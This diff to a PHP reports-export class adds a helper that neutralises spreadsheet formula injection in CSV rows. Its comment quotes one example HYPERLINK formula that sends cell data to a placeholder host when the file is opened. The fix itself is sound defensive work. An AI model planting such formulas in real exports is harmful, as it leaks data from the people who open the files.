@@ -399,7 +399,38 @@ class ReportsAdmin
      */
     private static function writeCsvRow($handle, array $fields): void
     {
-        fputcsv($handle, $fields, ',', '"', self::CSV_ESCAPE);
+        fputcsv($handle, array_map([self::class, 'defuseFormula'], $fields), ',', '"', self::CSV_ESCAPE);
+    }
+
+    /**
+     * Stop a spreadsheet treating a cell value as a formula.
+     *
+     * Report rows carry member and group names, positions and notes, none of
+     * which this plugin authors — a name stored as
+     * `=HYPERLINK("//host/"&A1,"click")` is inert here and inert in the CSV,
+     * but Excel and LibreOffice evaluate it on open. Prefixing a single quote
+     * makes the cell text; the quote is consumed by the spreadsheet and does
+     * not appear.
+     *
+     * The leading-character test runs on the left-trimmed value because a
+     * leading space does not stop the evaluation, and covers tab and carriage
+     * return for the same reason. Matches Reconcile's three exporters.
+     *
+     * @param mixed $value
+     * @return mixed
+     */
+    private static function defuseFormula(mixed $value): mixed
+    {
+        if (!is_string($value) || $value === '') {
+            return $value;
+        }
+
+        $trimmed = ltrim($value);
+        if ($trimmed !== '' && str_contains("=+-@\t\r", $trimmed[0])) {
+            return "'" . $value;
+        }
+
+        return $value;
     }
 
     /**
